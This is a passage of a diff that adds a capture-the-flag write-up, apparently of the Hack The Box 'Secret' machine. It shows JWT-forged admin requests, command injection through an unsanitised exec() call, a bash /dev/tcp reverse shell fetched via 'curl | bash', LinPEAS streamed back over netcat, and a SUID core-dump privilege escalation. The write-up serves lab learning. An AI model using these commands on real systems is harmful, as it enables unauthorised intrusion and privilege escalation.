+auth-token<span style="color:#f92672">:</span> <span style="color:#ae81ff">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWYxMGU5ZTYzMmIwZDA0NjNjOWIzYzEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxlZ2lhaHV5eUBlbWFpbC5jb20iLCJpYXQiOjE2NDMxODc4NzV9.EXXnBwTvW4WzwgURoqOP27L0aDR8V1bZ-hVX84dxP90</span>
+
+// Expected response
+HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 26 Jan 2022 09:19:11 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 76
+Connection: close
+X-Powered-By: Express
+ETag: W/&#34;4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0&#34;
+
+{&#34;creds&#34;:{&#34;role&#34;:&#34;admin&#34;,&#34;username&#34;:&#34;theadmin&#34;,&#34;desc&#34;:&#34;welcome back admin&#34;}}
+</code></pre></div><p>The response has confirmed our solution works successfully, do the same with <code>/api/logs</code> yields expected result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">// Request
+</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#a6e22e">GET</span> /api/logs <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.10.11.120</span>
+<span style="color:#960050;background-color:#1e0010">...</span>
+auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWYxMGU5ZTYzMmIwZDA0NjNjOWIzYzEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxlZ2lhaHV5eUBlbWFpbC5jb20iLCJpYXQiOjE2NDMxODc4NzV9.EXXnBwTvW4WzwgURoqOP27L0aDR8V1bZ-hVX84dxP90
+
+// Response
+HTTP/1.1 500 Internal Server Error
+Server: nginx/1.18.0 (Ubuntu)
+Date: Wed, 26 Jan 2022 09:29:09 GMT
+Content-Type: application/json; charset=utf-8
+Content-Length: 77
+Connection: close
+X-Powered-By: Express
+ETag: W/&#34;4d-xY8AsU/eUR22Yy/Fqfzp+1blTxU&#34;
+
+{&#34;killed&#34;:false,&#34;code&#34;:128,&#34;signal&#34;:null,&#34;cmd&#34;:&#34;git log --oneline undefined&#34;}
+</code></pre></div><p>More importantly, this endpoint also has a RCE functionality in the <code>file</code> parameter as heretofore spotted in <code>private.js</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#75715e">// private.js
+</span><span style="color:#75715e"></span>...
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">file</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">file</span>;
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">getLogs</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`git log --oneline </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">file</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
+<span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">getLogs</span>, (<span style="color:#a6e22e">err</span> , <span style="color:#a6e22e">output</span>) =&gt;{
+	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">err</span>){
+	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">err</span>);
+	<span style="color:#66d9ef">return</span>
+}
+</code></pre></div><h3 id="stage-2-remote-code-execution-to-reverse-shell">Stage 2: Remote Code <em>Exec()ution</em> to reverse shell<a href="#stage-2-remote-code-execution-to-reverse-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Regarding the prior snippet, <code>exec()</code> takes a query parameter, <code>file</code>, from the HTTP request as its input without being sanitized or filtered; thus allows arbitrary code execution on the remote server. In case some of you may not be familiar with <em><a href="https://nodejs.org/dist/latest-v6.x/docs/api/child_process.html#child_process_child_process_exec_command_options_callback">exec</a></em>, the function basically executes the inputted buffer as a chain of commands separated by semi-colons on its hosting system.</p>
+<p>The viability of the RCE is then to be tested with basic commands, it is also necessary to check for any infamous utilities capable of spawning a reverse shell, like <em>netcat</em>, <em>curl</em>, <em>awk</em> and so on.</p>
+<p><em><strong>Note:</strong> URL encoding is mandatory to perform complex input with special characters (spaces, dashes, etc.).</em></p>
+<pre tabindex="0"><code>Prints CURL's version
+file=-;curl --version
+</code></pre><p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_13-19.png" alt=""></p>
+<p>After guaranteeing that our code is fully functional, let us connect to the remote machine via a simple reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Create a reverse shell script and save it under ./www/rs.sh</span>
+<span style="color:#75715e">#!/bin/bash</span>
+bash -i &gt;&amp; /dev/tcp/10.10.14.9/9001 0&gt;&amp;<span style="color:#ae81ff">1</span> <span style="color:#75715e"># 10.10.14.9 is my current HTB ip</span>
+
+<span style="color:#75715e"># Hosting the ./www directory, locally</span>
+$ cd ./www
+$ python3 -m http.server <span style="color:#ae81ff">8088</span>
+
+<span style="color:#75715e"># Simultaneously, start our listener on port 9001 in another session</span>
+$ rlwrap -cAr nc -lvnp <span style="color:#ae81ff">9001</span>
+
+<span style="color:#75715e"># Send the RCE payload to the server</span>
+<span style="color:#75715e"># -;curl http://10.10.14.9:8088/rs.sh | bash</span>
+</code></pre></div><p>And we get ourselves a shell on the server, navigate to <code>$HOME</code> and read the user&rsquo;s flag.</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-08_14-41.png" alt=""></p>
+<h3 id="stage-3-privilege-escalation">Stage 3: Privilege Escalation<a href="#stage-3-privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>In this final stage, I would want to use <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>, one of my favorite enumeration tools, to aid us in gaining a better understanding of the target system. You can either inspect the output on-the-fly or stream it back to your machine for a more convenient examination.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># On victim&#39;s machine</span>
+<span style="color:#75715e"># This line will run LinPEAS in memory and stream the output to us.</span>
+<span style="color:#75715e"># Remember to change the IP according to yours.</span>
+$ curl http://10.10.14.9:8088/linpeas.sh | bash | nc 10.10.14.9 <span style="color:#ae81ff">9002</span>
+
+<span style="color:#75715e"># On our end</span>
+$ nc -lvnp <span style="color:#ae81ff">9002</span> | tee linpeas.output
+$ cat linpeas.output
+</code></pre></div><p>A lot of noises notwithstanding, LinPEAS does find <code>/opt/count</code>, an intriguing binary with SUID bit</p>
+<p><img src="D:/Development/github/repos/image-host/2022-01-13-HTB-Secret/2022-02-09_10-26.png" alt=""></p>
+<p>and its provided source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e"># /opt/code.c
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dirent.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/prctl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/stat.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;linux/limits.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">dircount</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>summary)
+{
+    DIR <span style="color:#f92672">*</span>dir;
+    <span style="color:#66d9ef">char</span> fullpath[PATH_MAX];
+    <span style="color:#66d9ef">struct</span> dirent <span style="color:#f92672">*</span>ent;
+    <span style="color:#66d9ef">struct</span> stat fstat;
+
+    <span style="color:#66d9ef">int</span> tot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, regular_files <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, directories <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, symlinks <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">if</span>((dir <span style="color:#f92672">=</span> opendir(path)) <span style="color:#f92672">==</span> NULL)
+    {
+        printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Unable to open directory.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        exit(EXIT_FAILURE);
+    }
+    <span style="color:#66d9ef">while</span> ((ent <span style="color:#f92672">=</span> readdir(dir)) <span style="color:#f92672">!=</span> NULL)
+    {
+        <span style="color:#f92672">++</span>tot;
+        strncpy(fullpath, path, PATH_MAX<span style="color:#f92672">-</span>NAME_MAX<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+        strcat(fullpath, <span style="color:#e6db74">&#34;/&#34;</span>);
+        strncat(fullpath, ent<span style="color:#f92672">-&gt;</span>d_name, strlen(ent<span style="color:#f92672">-&gt;</span>d_name));
+        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lstat(fullpath, <span style="color:#f92672">&amp;</span>fstat))
+        {
+            <span style="color:#66d9ef">if</span>(S_ISDIR(fstat.st_mode))
+            {
+                printf(<span style="color:#e6db74">&#34;d&#34;</span>);
+                <span style="color:#f92672">++</span>directories;
+            }
+            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(S_ISLNK(fstat.st_mode))
+            {
+                printf(<span style="color:#e6db74">&#34;l&#34;</span>);
+                <span style="color:#f92672">++</span>symlinks;
+            }
+            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(S_ISREG(fstat.st_mode))
+            {
+                printf(<span style="color:#e6db74">&#34;-&#34;</span>);
+                <span style="color:#f92672">++</span>regular_files;
+            }
+            <span style="color:#66d9ef">else</span> printf(<span style="color:#e6db74">&#34;?&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IRUSR) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IWUSR) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;w&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IXUSR) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IRGRP) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IWGRP) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;w&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IXGRP) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IROTH) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;r&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IWOTH) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;w&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+            printf((fstat.st_mode <span style="color:#f92672">&amp;</span> S_IXOTH) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;x&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;-&#34;</span>);
+        }
+        <span style="color:#66d9ef">else</span>
+        {
+            printf(<span style="color:#e6db74">&#34;??????????&#34;</span>);
+        }
+        printf (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ent<span style="color:#f92672">-&gt;</span>d_name);
+    }
+    closedir(dir);
+
+    snprintf(summary, <span style="color:#ae81ff">4096</span>, <span style="color:#e6db74">&#34;Total entries       = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Regular files       = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Directories         = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Symbolic links      = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, tot, regular_files, directories, symlinks);
+    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s&#34;</span>, summary);
+}
+
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">filecount</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>path, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>summary)
+{
+    FILE <span style="color:#f92672">*</span>file;
+    <span style="color:#66d9ef">char</span> ch;
+    <span style="color:#66d9ef">int</span> characters, words, lines;
+
+    file <span style="color:#f92672">=</span> fopen(path, <span style="color:#e6db74">&#34;r&#34;</span>);
+
+    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">==</span> NULL)
+    {
+        printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Unable to open file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        printf(<span style="color:#e6db74">&#34;Please check if file exists and you have read privilege.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        exit(EXIT_FAILURE);
+    }
+
+    characters <span style="color:#f92672">=</span> words <span style="color:#f92672">=</span> lines <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">while</span> ((ch <span style="color:#f92672">=</span> fgetc(file)) <span style="color:#f92672">!=</span> EOF)
+    {
+        characters<span style="color:#f92672">++</span>;
+        <span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">||</span> ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>)
+            lines<span style="color:#f92672">++</span>;
+        <span style="color:#66d9ef">if</span> (ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">||</span> ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\t&#39;</span> <span style="color:#f92672">||</span> ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">||</span> ch <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\0&#39;</span>)
+            words<span style="color:#f92672">++</span>;
+    }
+
+    <span style="color:#66d9ef">if</span> (characters <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+    {
+        words<span style="color:#f92672">++</span>;
+        lines<span style="color:#f92672">++</span>;
+    }
+
+    snprintf(summary, <span style="color:#ae81ff">256</span>, <span style="color:#e6db74">&#34;Total characters = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Total words      = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Total lines      = %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, characters, words, lines);
+    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">%s&#34;</span>, summary);
+}
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    <span style="color:#66d9ef">char</span> path[<span style="color:#ae81ff">100</span>];
+    <span style="color:#66d9ef">int</span> res;
+    <span style="color:#66d9ef">struct</span> stat path_s;
+    <span style="color:#66d9ef">char</span> summary[<span style="color:#ae81ff">4096</span>];
+
+    printf(<span style="color:#e6db74">&#34;Enter source file/directory name: &#34;</span>);
+    scanf(<span style="color:#e6db74">&#34;%99s&#34;</span>, path);
+    getchar();
+    stat(path, <span style="color:#f92672">&amp;</span>path_s);
+    <span style="color:#66d9ef">if</span>(S_ISDIR(path_s.st_mode))
+        dircount(path, summary);
+    <span style="color:#66d9ef">else</span>
+        filecount(path, summary);
+
+    <span style="color:#75715e">// drop privs to limit file write
+</span><span style="color:#75715e"></span>    setuid(getuid());
+    <span style="color:#75715e">// Enable coredump generation
+</span><span style="color:#75715e"></span>    prctl(PR_SET_DUMPABLE, <span style="color:#ae81ff">1</span>);
+    printf(<span style="color:#e6db74">&#34;Save results a file? [y/N]: &#34;</span>);
+    res <span style="color:#f92672">=</span> getchar();
+    <span style="color:#66d9ef">if</span> (res <span style="color:#f92672">==</span> <span style="color:#ae81ff">121</span> <span style="color:#f92672">||</span> res <span style="color:#f92672">==</span> <span style="color:#ae81ff">89</span>) {
+        printf(<span style="color:#e6db74">&#34;Path: &#34;</span>);
+        scanf(<span style="color:#e6db74">&#34;%99s&#34;</span>, path);
+        FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> fopen(path, <span style="color:#e6db74">&#34;a&#34;</span>);
+        <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">!=</span> NULL) {
+            fputs(summary, fp);
+            fclose(fp);
+        } <span style="color:#66d9ef">else</span> {
+            printf(<span style="color:#e6db74">&#34;Could not open %s for writing</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, path);
+        }
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><h4 id="code-breakdown">Code breakdown<a href="#code-breakdown" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>The source consists of three functions:</p>
+<ul>
+<li><code>dircount</code> counts the number of total directories within a given path. The function, however, is not exploitable as of its proper implementation.</li>
+<li><code>filecount</code> procedure reads and counts every single characters of a given file.</li>
+<li><code>main</code> reads input from STDIN and calls <code>dircount</code> whether the path is a directory; otherwise, invokes <code>filecount</code>. The function then prompts us to save the result as a file and exits.</li>
+</ul>
+<p>Even though the write feature sounds promising, the program&rsquo;s SUID is removed before we can do anything. Luckily, the author did give us a hint with the line <code>prctl(PR_SET_DUMPABLE, 1)</code> as the <code>PR_SET_DRUMPABLE</code> attribute normally takes <code>1</code> by default; however, it is reset to the current value in <code>/proc/sys/fs/suid_dumpable</code> whenever there is a change in the process&rsquo;s ownership or, particularly in this practice, its UID/GID. There are also other details and yet, we have the function fully covered <a href="https://man7.org/linux/man-pages/man2/prctl.2.html">here</a>.</p>
+<h4 id="solution">Solution<a href="#solution" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
+<p>Based on what we have discussed above, <code>filecount</code> has prior access to <code>/root/</code> and is able to read the content therein before <code>setuid</code> revokes our permission. Thus, the program technically has to be <em>stopped</em> or crashed, thereby dumping the <code>/root/root.txt</code> context to, in this case, <code>/var/crashes</code> and we can extract the dump using <code>apport-unpack</code>. I get the idea from <a href="https://askubuntu.com/a/186285">this answer</a> on AskUbuntu after literally hours of finding escalation methods with <code>prctl</code> which are only CVEs and unintended solutions although I do gain root access using them.</p>
 
       </div></div>
 
@@ -297,10 +1030,17 @@ Service detection performed. Please report any incorrect results at https://nmap
     </div>
     <div class="pagination__buttons">
         
+        <span class="button previous">
+            <a href="https://legiahuyy.github.io/blog/en/posts/kcsc-ctf-2022-re-secret/">
+                <span class="button__icon">←</span>
+                <span class="button__text">KCSC CTF 2022: secret [RE]</span>
+            </a>
+        </span>
+        
         
         <span class="button next">
-            <a href="https://legiahuyy.github.io/blog/en/posts/pwns-2/">
-                <span class="button__text">PWN Journey: Part 2</span>
+            <a href="https://legiahuyy.github.io/blog/en/posts/pwns-3/">
+                <span class="button__text">PWN Journey 3: More format string and ret2dlresolve</span>
                 <span class="button__icon">→</span>
             </a>
         </span>
